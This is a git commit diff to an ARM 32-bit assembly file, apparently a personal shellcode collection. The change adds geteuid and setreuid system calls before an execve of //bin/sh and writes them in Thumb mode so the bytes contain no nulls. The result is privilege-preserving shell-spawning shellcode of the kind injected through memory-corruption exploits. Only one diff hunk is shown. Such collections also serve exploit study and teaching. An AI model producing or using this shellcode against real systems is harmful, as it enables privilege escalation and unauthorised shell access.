532715fc223cc48439982afedfcd11bebc6e712b
japkettu <japkettu@gmail.com>
2019-02-19 15:09:39 +0200

    Rename and file content fix

--- arm_32bit/execve_setreuid.asm
+++ arm_32bit/execve_setreuid.asm
@@ -8,11 +8,22 @@ _start:
 add r6, pc, #1
 bx r6
 
+.code 16
+@ uid_t geteuid(void)
+@ r7: 49
+
+mov r7, #49		@ syscall number 49 (geteuid)
+svc 1			@ execute syscall (no null bytes)
+
+@ int setreuid(uid_t ruid, uid_t euid)
+mov r1, r0
+mov r7, #70		@ syscall number 70 (setreuid)
+svc 1
+
 @ execve(const char *filename, char *const argv[],char *const envp[]);
 @ r0: //bin/sh
 @ r1: //bin/sh
 @ r2: 0
-.code 16
 sub r2,r2,r2
 mov r0, pc
 add r0, #8    		@ 2 * rivimäärä ennen .ascii osiota
